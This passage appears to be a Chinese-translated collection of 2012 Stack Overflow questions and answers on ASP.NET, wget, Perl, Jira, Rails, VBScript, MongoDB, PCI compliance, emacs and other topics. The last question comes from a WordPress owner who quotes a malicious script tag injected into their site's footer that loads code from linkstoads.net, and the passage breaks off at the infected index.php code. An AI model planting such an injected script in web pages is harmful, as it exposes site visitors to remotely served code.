<asp:GridView ID="gvTaskStatus" runat="server" EmptyDataText="No tasks match your search criteria"  
 AllowSorting="true"  Visible="true" AutoGenerateEditButton="true" 
 DataKeyNames="EDA_RequestID"
 CssClass="GenDisplayStyle"  CellPadding="3"
 AutoGenerateColumns="false" Font-Size="X-Small"  

 OnSorted="gvSorted"                    
 OnRowUpdating="gvTask_OnRowUpdating" 
 OnRowUpdated="gvTask_OnRowUpdated" 
 OnRowCancelingEdit="gvTask_OnRowCancelled"  
 OnRowDataBound="gvTaskStatus_RowDataBound" 
 OnRowEditing="gvTaskStatus_OnRowEditing"
 >

<HeaderStyle CssClass="GridHeader" />
<AlternatingRowStyle BackColor="AliceBlue"/>

<Columns>
  <asp:BoundField DataField="EDA_RequestID" HeaderText="Request ID" ReadOnly="true" Visible="false" />
  <asp:BoundField DataField="Requestor" HeaderText="Requestor"  
              SortExpression="Requestor" ReadOnly="true"/>
  <asp:BoundField DataField="ProjectName" HeaderText="Project Name" 
              SortExpression="ProjectName" />
  <asp:BoundField DataField="ChargeNumber" HeaderText="Charge Number"
              SortExpression="ChargeNumber" />

  <asp:TemplateField HeaderText="Assigned To" SortExpression="AssignedTo" >
      <ItemTemplate>
         <asp:Label Text='<%#Eval("AssignedTo")%>' runat="server" ID="ShowAssigned" />
      </ItemTemplate>
      <EditItemTemplate>
         <asp:DropDownList runat="server" ID="EditAssigned" AutoPostBack="False"    
                           OnSelectedIndexChanged="PersonAssigned" >
         </asp:DropDownList>
      </EditItemTemplate>
      </asp:TemplateField>

<asp:BoundField DataField="MEPartNumber" HeaderText="Part Number"  
                SortExpression="MEPartNumber" />
<asp:BoundField DataField="ReceivedDate" HeaderText="Date Submitted"  
             SortExpression="ReceivedDate" ReadOnly="true"/>
    <!-- Some rows, all boundfields, deleted for length  -->        

</Columns>
</asp:GridView> 
```

和数据源：

```
<asp:SqlDataSource ID="EDASource" runat="server" 
        DataSourceMode="DataSet" CancelSelectOnNullParameter="false"    
        ConnectionString="<%$ ConnectionStrings:MECDConnectionString %>" 
        ProviderName="System.Data.SqlClient" OnSelected="SqlDataSelectedEvent" >

     <SelectParameters>
        <asp:ControlParameter Name="MEPNTxt"    ControlID="MEPNTxt"      PropertyName="Text"   Type="String" />
        <asp:ControlParameter Name="CommentsTxt" ControlID="CommentsTxt" PropertyName="Text"   Type="String" />  
        <asp:Parameter Name="AssignedTo" Type="String" />
        <asp:Parameter Name="TopStatus"  Type="String" />
        <asp:Parameter Name="Requestor"  Type="String" />
        <asp:Parameter Name="SubmitDate" Type="String" />
     </SelectParameters>

     <UpdateParameters>
        <asp:Parameter Name="UdEDA_ID"       Type="Int32" />
        <asp:Parameter Name="UdAssignedTo"   Type="String" />
        <asp:Parameter Name="UdActEndDate"   Type="DateTime" />
        <asp:Parameter Name="UdProjectName"  Type="String" />
        <asp:Parameter Name="UdChargeNumber" Type="String" />
        <asp:Parameter Name="UdDatasheetURL" Type="String" />
        <asp:Parameter Name="UdComments"     Type="String" />
        <asp:Parameter Name="UdMEPartNumber" Type="String" />
        <asp:Parameter Name="UdTopStatus"    Type="String" />
        <asp:Parameter Name="UdSymStatus"    Type="String" />
        <asp:Parameter Name="UdSymChecked"   Type="String" />
        <asp:Parameter Name="UdFtpStatus"    Type="String" />
        <asp:Parameter Name="UdFtpChecked"   Type="String" />
        <asp:Parameter Name="UdParamStatus"  Type="String" />
     </UpdateParameters>

   </asp:SqlDataSource> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T20:04:30.970

> 我已尝试在 PageLoad 和各种事件处理程序中在我能想到的所有点重新绑定网格（重新设置 DataSourceID 字符串，或者重新设置 DataBind() 调用）。

我怀疑这是你的问题。根据您的描述，听起来您不需要显式地重新绑定网格，并且这样做时您应该期望网格的状态会被重置。我建议删除对 DataBind() 的所有调用或重置 DataSourceID。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T20:55:15.907

页面后面的代码肯定有助于分析问题。

最常见的原因是甚至回发中的数据绑定。因此，请确保您在页面加载中的数据绑定是这样的：

```
if(!Page.PostBack){
//Your Grid Databinding
} 
```

# ubuntu - 使用 wget 获取 csv

> ID：13093447
> 
> 赞同：0
> 
> 时间：2012-10-26T19:48:18.057
> 
> 标签：ubuntu, wget

我正在使用 Ubuntu，并且有一个[已知的 URL](http://www.wunderground.com/history/airport/HOU/2011/7/1/CustomHistory.html?dayend=26&monthend=10&yearend=2012&format=1)，我需要将其下载/保存为 CSV。URL基于一个参数并且经常为项目更改，所以我想编写一个脚本来进行下载，这样我就不必每次都手动保存它。

我试图使用 wget 来获取文件，但网站将内容显示为 CSV，而文件本身是 HTML。如何将页面内容保存为纯 csv？

```
wget -O my.csv [url] 
```

任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T20:07:29.313

似乎文件中唯一的 HTML 位于`<br />`每一行的末尾。要删除它，您可以

```
wget -O- "$URL" | sed 's#<br />$##' > my.csv 
```

# perl - 在数组中传递变量

> ID：13093448
> 
> 赞同：-1
> 
> 时间：2012-10-26T19:48:25.203
> 
> 标签：perl, mechanize

我有下面的代码，应该单击并转到带有文本的每个链接...发生的事情是`$l`保留字母 A，并收集 A 26x 的页面...有什么想法吗？

```
my $mech = WWW::Mechanize->new();
$mech->get($info->website);

my $te = HTML::TableExtract->new();
my @abc = ("A" .. "Z");

foreach my $letter (@abc){

$mech->find_link(text => $letter);
$mech->follow_link(text => $letter);

$content = $mech->content();

$te->parse($content);

$table = $te->first_table_found;

$str .= Dumper $table;

$mech->back();
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T20:09:03.773

跟随链接后，您必须返回原始页面才能使所有链接再次可用。只需添加

```
$mech->back; 
```

到循环结束。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T20:04:38.177

问题是 HTMLTableExtract 没有获取新数据。将 TE 初始化移动到循环中 $te->parse($content) 正在覆盖它已经拥有的内容。

# jira - 使用 Jira 的 API 为问题添加附件

> ID：13093450
> 
> 赞同：0
> 
> 时间：2012-10-26T19:48:26.503
> 
> 标签：jira, attachment

我想知道 Jira 的 REST API 是否支持将附件添加到问题（现有的或新的）以及上传附件的能力？查看 API 文档，我什么也没看到，但也许我错过了一些东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T19:55:59.880

这看起来像您所追求的方法：

[http://docs.atlassian.com/jira/REST/latest/#id339692](http://docs.atlassian.com/jira/REST/latest/#id339692)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T19:52:18.627

创建问题后，您可以单击该特定问题的更多操作选项卡。

您将能够附加文件并附加屏幕截图。

如果我理解您的要求有误，请纠正我。

谢谢。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-07-15T04:08:24.520

## 在 Python 中：

jira = JIRA(options="Jira_Server_URL", basic_auth=("userID", "Password"))
jira.add_attachment(issue=issue, attachment="attachment_path")

相应地替换 Jira_Server_URL、用户 ID、密码和附件路径。

# android - 在游戏中显示对话

> ID：13093454
> 
> 赞同：0
> 
> 时间：2012-10-26T19:48:57.450
> 
> 标签：android, opengl-es

> **可能重复：**
> [在 OpenGL ES (Android) 中绘制文本](https://stackoverflow.com/questions/1339136/draw-text-in-opengl-es-android)

我正在用 Android 开发视频游戏。为此，我使用的是 OpenGL-ES。

我有一个关于使用 OpenGL-ES 显示文本的问题。有什么方法可以显示测试吗？因为如果不是这样，我想到的唯一方法就是拥有一个包含所有字母的图像并逐个字母地显示文本，这可能真的很难。

有什么线索吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T19:52:19.207

不，除了您建议的纹理映射四边形之外，没有办法在 OpenGLES 中显示文本。

我不知道您的应用程序的详细信息，但是由于您使用的是 android，请不要忘记您可以在 OpenGL 视图之上绘制 Android 视图，因此根据您需要的文本类型，实现它可能更有意义你的安卓用户界面。

# web-services - 如何在 wsgen 类路径中引用 *.jar 文件

> ID：13093455
> 
> 赞同：4
> 
> 时间：2012-10-26T19:48:56.663
> 
> 标签：web-services, ant

我无法在 ANT 文件中使用 wsgen 定义我的类路径。

```
 <target name="wsgen">
    <property name="wsgen_cp" value="./build/classes/" /> 

    <echo message="classpath is : ${wsgen_cp}"/>
    <exec executable="wsgen">
        <!-- Classpath -->
        <arg value="-verbose" />            
        <arg value="-classpath" />
        <arg value="${wsgen_cp}" />
        <!-- Sortie des sources -->
        <arg value="-d" />
        <arg value="${project.build.dir}/build/generated/"/>
        <arg value="-r" /> 
        <arg value="${project.build.dir}/build/wsdl"/>
        <arg value="-s" />
        <arg value="${project.build.dir}/build/sources"/>
        <!-- Classes de WebServices -->
        <arg value="-keep" />
        <arg value="rpm.patient.wsimpl.RpmPatientInterfaceImpl" />
    </exec>
</target> 
```

运行目标后，出现以下错误：

```
[exec] Exception in thread "main" java.lang.NoClassDefFoundError: rpm/patient/RpmPatientInterface
 [exec]     at java.lang.ClassLoader.defineClass1(Native Method)
 [exec]     at java.lang.ClassLoader.defineClass(ClassLoader.java:791)
 [exec]     at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142)
 [exec]     at java.net.URLClassLoader.defineClass(URLClassLoader.java:449)
 [exec]     at java.net.URLClassLoader.access$100(URLClassLoader.java:71)
 [exec]     at java.net.URLClassLoader$1.run(URLClassLoader.java:361)
 [exec]     at java.net.URLClassLoader$1.run(URLClassLoader.java:355)
 [exec]     at java.security.AccessController.doPrivileged(Native Method)
 [exec]     at java.net.URLClassLoader.findClass(URLClassLoader.java:354)
 [exec]     at java.lang.ClassLoader.loadClass(ClassLoader.java:423)
 [exec]     at java.lang.ClassLoader.loadClass(ClassLoader.java:356)
 [exec]     at com.sun.tools.internal.ws.wscompile.WsgenOptions.getClass(WsgenOptions.java:287)
 [exec]     at com.sun.tools.internal.ws.wscompile.WsgenOptions.validateEndpointClass(WsgenOptions.java:223)
 [exec]     at com.sun.tools.internal.ws.wscompile.WsgenOptions.validate(WsgenOptions.java:214)
 [exec]     at com.sun.tools.internal.ws.wscompile.WsgenTool.run(WsgenTool.java:110)
 [exec]     at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
 [exec]     at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
 [exec]     at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
 [exec]     at java.lang.reflect.Method.invoke(Method.java:601)
 [exec]     at com.sun.tools.internal.ws.Invoker.invoke(Invoker.java:120)
 [exec]     at com.sun.tools.internal.ws.WsGen.main(WsGen.java:42)
 [exec] Caused by: java.lang.ClassNotFoundException: rpm.patient.RpmPatientInterface
 [exec]     at java.net.URLClassLoader$1.run(URLClassLoader.java:366)
 [exec]     at java.net.URLClassLoader$1.run(URLClassLoader.java:355)
 [exec]     at java.security.AccessController.doPrivileged(Native Method)
 [exec]     at java.net.URLClassLoader.findClass(URLClassLoader.java:354)
 [exec]     at java.lang.ClassLoader.loadClass(ClassLoader.java:423)
 [exec]     at java.lang.ClassLoader.loadClass(ClassLoader.java:356)
 [exec]     ... 21 more 
```

当我将相应的 jar 附加到我的类路径（rpm/patient/RpmPatientInterface 所在的位置）时：

似乎类路径无效，因为它找不到我试图从中生成存根的文件：[exec] 找不到类：“rpm.patient.wsimpl.RpmPatientInterfaceImpl”[exec] 用法：WSGEN [options]

有什么可以帮助我的提示吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2019-01-15T01:54:14.807

我正在与一个我不知道如何生成 WSDL 的遗留系统作斗争。它包含 maven 库，我必须在参数中一一包含它们`-cp`，我不能使用通配符之类的`java -cp lib/*`命令，不知道为什么。无论如何，希望下面有帮助：

> D:\MyData\Software\JavaJDK\bin\wsgen -verbose -keep -cp "spring-tx-4.0.2.RELEASE.jar;spring-web-4.0.2.RELEASE.jar;D:/my-xxx-项目/目标/类” com.xxx.ws.webservice.xxxImpl -wsdl

我在`target/lib`路径中执行这个，包含所有的 Maven 罐子。`D:/my-xxx-project/target/classes`包含所有 Java 类。

对于您的情况，您只需在以下位置添加多个 jars 文件路径（用 分隔`;`）：

> `<property name="wsgen_cp" value="./build/classes/" />`

# javascript - 如何通过调整浏览器窗口大小来保持纵横比

> ID：13093456
> 
> 赞同：4
> 
> 时间：2012-10-26T19:48:56.860
> 
> 标签：javascript, html, css

我有一个使用 HTML/CSS 构建的页面，该页面仅用于在电视上显示。我已经开发出完美适合 1920x1080 比例的页面，但我想要一种方法来让页面按与原始设计完全相同的纵横比放大或缩小。有没有我可以用来帮助保持恒定比率的 Javascript 脚本？

编辑：这最终将变成一个 RoR 应用程序，它将不断更新新闻/事件/等内容。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T19:56:49.500

一个简单的监听窗口调整大小就可以解决这个问题：

```
$(window).on('resize',funciton(){
  var self=$('#ur_id');
  self.height( self.width() * (1080/1920))
}) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-26T19:51:14.503

您可以为此使用 CSS @media 查询

```
@media screen and (min-width: 1920px) {
   /*Styles goes here*/
} 
```

或者你可以使用`media = projection`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T20:47:31.617

支持 1920x1080 分辨率的设备的设计大多不适用于移动设备。也许您需要隐藏一些元素（通常是侧边栏）或减小字体大小，加载不同的徽标......所以最好的解决方案是使用@Mr. 查询的[响应式网页设计。](http://en.wikipedia.org/wiki/Responsive_web_design)`@media`外星人建议。

> 响应式网页设计是一种网页设计方法，其中网站经过精心设计，可在各种设备（从台式计算机显示器到移动设备）上提供最佳查看体验——轻松阅读和导航，只需最少的调整大小、平移和滚动电话）。

您可以在 SmashingMagazine上查看一些[指南和教程。](http://www.smashingmagazine.com/responsive-web-design-guidelines-tutorials/)

# ruby-on-rails - 未定义的方法“路径”# （无方法错误）

> ID：13093457
> 
> 赞同：0
> 
> 时间：2012-10-26T19:48:59.087
> 
> 标签：ruby-on-rails, ruby, cucumber, bundle

运行 bundle exec cucumber 时出现此错误。这是 Rails 版本错误吗？如何检查正在使用的 rails 是否在 Rails::Application::RoutesReloader 类中定义了此方法，以查看是否需要升级/降级？如果没有，有人有什么建议吗？

编辑：

堆栈跟踪：

```
undefined method `paths' for #<Rails::Application::RoutesReloader:0xac73454> (NoMethodError)
/usr/local/lib/ruby/gems/1.9.1/gems/railties-3.1.0/lib/rails/engine.rb:517:in `block in <class:Engine>'
/usr/local/lib/ruby/gems/1.9.1/gems/railties-3.1.0/lib/rails/initializable.rb:25:in `instance_exec'
/usr/local/lib/ruby/gems/1.9.1/gems/railties-3.1.0/lib/rails/initializable.rb:25:in `run'
/usr/local/lib/ruby/gems/1.9.1/gems/railties-3.1.0/lib/rails/initializable.rb:50:in `block in run_initializers'
/usr/local/lib/ruby/gems/1.9.1/gems/railties-3.1.0/lib/rails/initializable.rb:49:in `each'
/usr/local/lib/ruby/gems/1.9.1/gems/railties-3.1.0/lib/rails/initializable.rb:49:in `run_initializers'
/usr/local/lib/ruby/gems/1.9.1/gems/railties-3.1.0/lib/rails/application.rb:92:in `initialize!'
/usr/local/lib/ruby/gems/1.9.1/gems/cucumber-rails-1.3.0/lib/cucumber/rails/application.rb:15:in `initialize!'
/usr/local/lib/ruby/gems/1.9.1/gems/railties-3.1.0/lib/rails/railtie/configurable.rb:30:in `method_missing'
/home/ubuntu/hw3_rottenpotatoes/config/environment.rb:5:in `<top (required)>'
/usr/local/lib/ruby/gems/1.9.1/gems/cucumber-rails-1.3.0/lib/cucumber/rails.rb:7:in `require'
/usr/local/lib/ruby/gems/1.9.1/gems/cucumber-rails-1.3.0/lib/cucumber/rails.rb:7:in `<top (required)>'
/home/ubuntu/hw3_rottenpotatoes/features/support/env.rb:7:in `require'
/home/ubuntu/hw3_rottenpotatoes/features/support/env.rb:7:in `<top (required)>'
/usr/local/lib/ruby/gems/1.9.1/gems/cucumber-1.2.1/lib/cucumber/rb_support/rb_language.rb:129:in `load'
/usr/local/lib/ruby/gems/1.9.1/gems/cucumber-1.2.1/lib/cucumber/rb_support/rb_language.rb:129:in `load_code_file'
/usr/local/lib/ruby/gems/1.9.1/gems/cucumber-1.2.1/lib/cucumber/runtime/support_code.rb:171:in `load_file'
/usr/local/lib/ruby/gems/1.9.1/gems/cucumber-1.2.1/lib/cucumber/runtime/support_code.rb:83:in `block in load_files!'
/usr/local/lib/ruby/gems/1.9.1/gems/cucumber-1.2.1/lib/cucumber/runtime/support_code.rb:82:in `each'
/usr/local/lib/ruby/gems/1.9.1/gems/cucumber-1.2.1/lib/cucumber/runtime/support_code.rb:82:in `load_files!'
/usr/local/lib/ruby/gems/1.9.1/gems/cucumber-1.2.1/lib/cucumber/runtime.rb:175:in `load_step_definitions'
/usr/local/lib/ruby/gems/1.9.1/gems/cucumber-1.2.1/lib/cucumber/runtime.rb:40:in `run!'
/usr/local/lib/ruby/gems/1.9.1/gems/cucumber-1.2.1/lib/cucumber/cli/main.rb:43:in `execute!'
/usr/local/lib/ruby/gems/1.9.1/gems/cucumber-1.2.1/lib/cucumber/cli/main.rb:20:in `execute'
/usr/local/lib/ruby/gems/1.9.1/gems/cucumber-1.2.1/bin/cucumber:14:in `<top (required)>'
/usr/local/bin/cucumber:19:in `load'
/usr/local/bin/cucumber:19:in `<main>' 
```

我认为这是 rails 的错误，因为当我尝试运行 rails 服务器时，它给了我同样的错误。安装一定发生了什么事，因为该命令之前运行没有问题

# vbscript - 比较 VBScript 中的五个日期

> ID：13093469
> 
> 赞同：0
> 
> 时间：2012-10-26T19:50:07.240
> 
> 标签：vbscript

我编写了以下代码来查找五个日期中最早的日期。它按预期工作，但我很好奇是否有更优雅的方式来比较五个日期。有没有人有任何想法？

```
Dim sTemp
sTemp = ""

If IsDate(dtOne) Then
    If IsDate(dtTwo) Then
        If CDate(dtOne) < CDate(dtTwo) Then
            sTemp = dtOne
        Else
            sTemp = dtTwo
        End If
    Else
        sTemp = dtOne
    End If
ElseIf IsDate(dtTwo) Then
    sTemp = dtTwo
End If

If IsDate(dtThree) Then
    If IsDate(sTemp) Then
        If CDate(dtThree) < CDate(sTemp) Then
            sTemp = dtThree
        End If
    Else
        sTemp = dtThree
    End If
End If

If IsDate(dtFour) Then
    If IsDate(sTemp) Then
        If CDate(dtFour) < CDate(sTemp) Then
            sTemp = dtFour
        End If
    Else
        sTemp = dtFour
    End If
End If

If IsDate(dtFive) Then
    If IsDate(sTemp) Then
        If CDate(dtFive) < CDate(sTemp) Then
            sTemp = dtFive
        End If
    Else
        sTemp = dtFive
    End If
End If 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T23:41:53.873

像这样的事情怎么样，它会进行每次比较，如果传递的变量都不是日期，它将 sTemp 恢复为“”：

```
Dim sTemp
sTemp = ""
sTemp = OldestDate(dtOne, dtTwo)
sTemp = OldestDate(dtThree, sTemp)
sTemp = OldestDate(dtfour, sTemp)
sTemp = OldestDate(dtfive, sTemp)

Function OldestDate(dtOne, dtTwo)
    If IsDate(dtOne) Then
        If IsDate(dtTwo) Then
            If CDate(dtOne) < CDate(dtTwo) Then
                OldestDate = dtOne
            Else
                OldestDate = dtTwo
            End If
        Else
            OldestDate = dtOne
        End If
    ElseIf IsDate(dtTwo) Then
        OldestDate = dtTwo
    Else
         OldestDate = ""
    End If
End Function 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-27T12:21:36.083

我会使用这样的东西：

```
sTemp = GetOldestOf(sTemp, dtOne)   ' this instruction makes "dtOne" the current
                                    ' current oldest date, b/c "sTemp" is auto-
                                    ' initialized as Empty
sTemp = GetOldestOf(sTemp, dtTwo)
sTemp = GetOldestOf(sTemp, dtThree)
sTemp = GetOldestOf(sTemp, dtFour)
sTemp = GetOldestOf(sTemp, dtFive)

If isEmpty(sTemp) Then
  WScript.Echo "No valid date found!"
Else
  WScript.Echo "Oldest date is: " & sTemp
End If

' pre-condition: d1 is either Empty or the current oldest date
Function GetOldestOf(ByVal d1, ByVal d2)
  GetOldestOf = d1          ' make d1 the default return value
  If IsDate(d2) Then        ' d2 is a valid date
    d2 = CDate(d2)
    If IsEmpty(d1) Then     ' if d1 is empty, d2 is automatically oldest
      GetOldestOf = d2
    ElseIf d1 > d2 Then     ' otherwise check if d2 is older
      GetOldestOf = d2
    End If
  End If
End Function 
```

`GetOldestOf()`如果参数是有效日期并且第一个参数是`Empty`或比第二个参数更新，则返回第二个参数（转换为日期）。否则，该函数返回（未修改的）第一个参数，根据定义，该参数是`Empty`当前最旧日期或最旧日期。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T15:33:58.037

您要求一种优雅的方法，然后使用 ArrayList，对其进行填充和排序。在概念验证代码下方，它不处理异常，例如没有一个日期是有效的：

```
' Create a new arraylist
Set arrayList = createobject("System.Collections.ArrayList")

' Loop through all dates
For each d in array("23-5-2007", "28-6-2010", "16-9-2001", "32-12-2000")
     ' See if the date is valid. If true, convert it to a date and add it to the list
    If isDate(d) Then arrayList.Add cDate(d)
Next

' Sort the list from oldest to newest date
arrayList.Sort

' Get the first item, it will be the oldest date (16-9-2001)
OldestDate = arrayList.Item(0) 
```

# mongodb - 如何将一组祖先 ID 存储为列表 在 C# 中用于 MongoDB？

> ID：13093470
> 
> 赞同：0
> 
> 时间：2012-10-26T19:50:09.530
> 
> 标签：mongodb, foreign-keys, mongodb-.net-driver

我有一个包含祖先 id 列表的 POCO C# 类。我想存储这个列表，`List<string>`以便我的域项目不需要依赖于 mongodb c# 驱动程序。这对我的 Id 属性很有效。我能够对Id 属性使用**RegisterClassMap**方法（来自[MongoDB C# Driver docs ）：](http://www.mongodb.org/display/DOCS/CSharp+Driver+Serialization+Tutorial#CSharpDriverSerializationTutorial-Classlevelserializationoptions)

```
BsonClassMap.RegisterClassMap<Employee>(cm => {
    cm.AutoMap();
    cm.IdMemberMap.SetRepresentation(BsonType.ObjectId);
}); 
```

但是我不知道如何指定一个字符串数组（或者`List<string>`在我的情况下是 a ）实际上是一个**ObjectIds**数组。

请帮忙！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-30T14:21:50.213

好的，我终于找到了我要找的东西。非常感谢[craiggwilson 在 Google Groups 上的帖子](https://groups.google.com/forum/#!topic/mongodb-csharp/hP0bGPyfJhs)，如果没有阅读该帖子，我不会想到尝试以下内容。

对于 C# 中的以下“内容”类

```
public class Content
{
    public List<string> AncestorIds { get; set; }

    public string ParentId { get; set; }

    public string Title { get; set; }

    public string Body { get; set; }
} 
```

它可以在应用程序启动时执行以下代码：

```
BsonClassMap.RegisterClassMap<Content>(cm =>
{
    cm.AutoMap();

    // Single ObjectId represented in C# as a string
    cm.GetMemberMap(c => c.ParentId).SetRepresentation(BsonType.ObjectId);

    // Array of ObjectIds represented in C# as a List<string>
    cm.GetMemberMap(c => c.AncestorIds).SetSerializationOptions(new ArraySerializationOptions(new RepresentationSerializationOptions(BsonType.ObjectId)));
}); 
```

# java - 如何在 LINUX 中获取多个 JBOSS 节点的 CPU 使用率

> ID：13093471
> 
> 赞同：1
> 
> 时间：2012-10-26T19:50:13.477
> 
> 标签：java, linux, jboss

有没有办法在 linx 中获取几个 jboss 节点的 CPU 使用率？

我根据以下语法盯着节点

> home/xxx/jboss-4.0.3SP1/bin/run.sh -c node1 -b localhost
> 
> home/xxx/jboss-4.0.3SP1/bin/run.sh -c node2 -b localhost

但问题是上述两个进程的进程名称都是“java”。（但有不同的 PID）有没有办法区分上述两个进程？

如果我使用顶部 | grep 'java' 它显示所有但不是单独显示。例如：我想获取 node1 only 、 node2 only 、 node1 和 node2 的 CPU 使用率。我玩了一些 grep 参数更改，但没有运气。

而且我不需要像“top”命令那样观看我想要那个java进程（例如：node1）当时的CPU使用率。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T19:52:29.410

试试这个`ps`命令而不是`top`：

```
ps -C java -o pid,tid,pcpu,cmd 
```

有关更多详细信息`ps`，请参阅[`ps(1)`](http://unixhelp.ed.ac.uk/CGI/man-cgi?ps)

如果要过滤结果，流行的工具是`grep`：

```
ps -C java -o pid,tid,pcpu,cmd | grep 'home/xxx/jboss-4.0.3SP1/bin/run.sh' 
```

# javascript - 可更新的 jsRender 模板

> ID：13093473
> 
> 赞同：0
> 
> 时间：2012-10-26T19:50:20.783
> 
> 标签：javascript, jquery, jquery-templates, jsrender

呈现模板后，我需要根据模板内的字段进行更改。在这里我做了一个不工作的例子：http: [//jsfiddle.net/DrZ25/3/](http://jsfiddle.net/DrZ25/3/)

jsRender 渲染模板并更改每行输入字段会更改`year`示例中的 ，但如果将新电影添加到列表中 - 不会进行任何更改

有什么选择可以使它工作吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T19:54:19.913

您必须使用`live`将事件绑定到`input`.

```
$("input").live('change',function() {
    var id = $(this).attr("id");
    var year = $(this).val();

    $( "#year-"+id ).html(year);
}); 
```

​</p>

检查此工作[链接](http://jsfiddle.net/DrZ25/4/)

# subdomain - PCI 是否涵盖子域？

> ID：13093475
> 
> 赞同：1
> 
> 时间：2012-10-26T19:50:33.180
> 
> 标签：subdomain, pci-dss, pci-compliance

我被要求为接受付款的客户设置一些注册表单，类似于本网站 ( [https://www.martialartstechnologies.com/register?tournamentID=82](https://www.martialartstechnologies.com/register?tournamentID=82) )。我是 Authorize.net 的经销商，但有时在客户发现他们需要符合 PCI 标准后，我发现他们很难注册。我正在考虑创建一个符合 PCI 标准的站点域，然后在他们自己的个人子域中运行每个客户的注册页面。如果我这样做，该域上的 PCI 合规性是否对每个子域都无效，还是仍会被覆盖？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-01-27T04:29:27.060

只有**公司**才能符合 PCI，而不是服务器、站点、特定脚本、域或子域名。整个基础设施，包括办公室 WiFi 网络和橱柜锁等都在接受审计。你不能欺骗审计员给橱柜涂上不同的颜色并声称它不是你的。

即使您有 1000 个域名——它们指向位于全球 1000 个地方的 1000 台服务器——你也必须将它们全部列出以进行 PCI 审计，并使它们都符合 PCI 标准。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-27T21:07:44.947

子域可以在不同的服务器上，所以要回答的第一个问题是“相同或不同的服务器”？如果在不同的服务器上处理信用卡信息，则无论如何都需要使每台服务器都符合 PCI 标准。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-28T08:34:55.860

PCI 合规性处理代码/基础设施的问题。您不能按照建议自动将其扩展到子域 - 即使主域是合规的。

尽管如此，如果您对所有子域使用相同的基础设施，您可以处理与代码相关的漏洞，或者只是将整个结构封装在符合 PCI DDS 的 WAF 中（我建议符合 Cloud PCI DDS 的 WAF 以降低成本）。

# git - 如何使 emacs 与 git 的文本着色一起工作？

> ID：13093476
> 
> 赞同：4
> 
> 时间：2012-10-26T19:50:35.910
> 
> 标签：git, emacs

在我当前的开发环境中，当我`git rebase`以交互模式 ( `--interactive`) 运行时，它通常会打开`vi`并提示我对某些文本文件进行更改，以便我告诉它如何处理变基。vi 以似乎由 git 确定的方式突出显示这些文件。（在此上下文中对 git 具有特殊含义的关键字，如“pick”、“squash”等，用不同的颜色突出显示。）

我更喜欢使用 emacs 而不是 vi，因此我将 git 配置为改为打开 emacs ( `git config --global core.editor "emacs -nw"`)。不幸的是，emacs 并没有像 vi 那样突出显示 git 提供的文件。我怎样才能解决这个问题？

* * *

**编辑：**

如果你不熟悉交互式 git rebase 生成的文件，这里有一个例子：

```
pick f218f23 A major overhaul of the cucumber integration tests
pick 601d8f4 A bunch of minor bug fixes and refactoring
pick 1adc507 Adding and updating documentation for various files.

# Rebase ff8cb22..1adc507 onto ff8cb22
#
# Commands:
#  p, pick = use commit
#  r, reword = use commit, but edit the commit message
#  e, edit = use commit, but stop for amending
#  s, squash = use commit, but meld into previous commit
#  f, fixup = like "squash", but discard this commit's log message
#  x <cmd>, exec <cmd> = Run a shell command <cmd>, and stop if it fails
#
# If you remove a line here THAT COMMIT WILL BE LOST.
# However, if you remove everything, the rebase will be aborted.
c:\my_project\.git\rebase-merge\git-rebase-todo [unix] (15:50 26/10/2012) 
```

在此示例中，关键字“pick”、修订哈希、提交描述和注释都将以不同的颜色突出显示。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T20:49:18.120

要么已经在某个地方有一个模式（例如，作为 magit 的一部分），要么有人必须为它编写一个模式（应该相当容易，如果你向我们展示一些示例内容，以及一些关于哪种类型的提示他们拥有的文件名）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:52:03.540

[http://bogolisk.github.com/egg/egg-log-rebase.png](http://bogolisk.github.com/egg/egg-log-rebase.png)

Egg 内置了对交互式变基的支持。您**首先**选择 DAG 上的提交，**然后**启动交互式 rebase。

-- [http://bogolisk.github.com/egg/](http://bogolisk.github.com/egg/)

# wordpress - 我的 wordpress 博客中指向 linkstoads.net 的链接，可能是病毒。我该如何摆脱它？

> ID：13093482
> 
> 赞同：1
> 
> 时间：2012-10-26T19:50:51.353
> 
> 标签：wordpress, security, virus

最近（过去 2 周）这行代码出现在 wordpress 博客的页脚中：

```
<script type="text/javascript" src="http://linkstoads.net/keller/link.php?id=3" name="linkstats"></script> 
```

我没有把它放在这里。我不知道它的作用；但我想要它。

对于我的第一次尝试，我只是更换了模板，几分钟后它就消失了。但它又回来了。

所以我找到了我的 index.php 文件（不是模板，第一个 index.php）并找到了该代码：

```
#c3284d#
